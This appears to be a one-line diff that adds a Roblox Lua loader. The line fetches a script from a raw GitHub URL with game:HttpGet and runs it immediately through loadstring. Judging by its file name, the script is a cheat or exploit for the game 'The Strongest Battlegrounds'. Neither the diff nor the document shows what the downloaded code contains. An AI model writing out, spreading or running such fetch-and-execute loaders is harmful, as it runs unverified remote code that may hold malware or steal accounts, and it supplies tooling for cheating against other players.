@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/the-strongest-battlegrounds-spam7-jvbx6ti2i82s4w.lua"))()
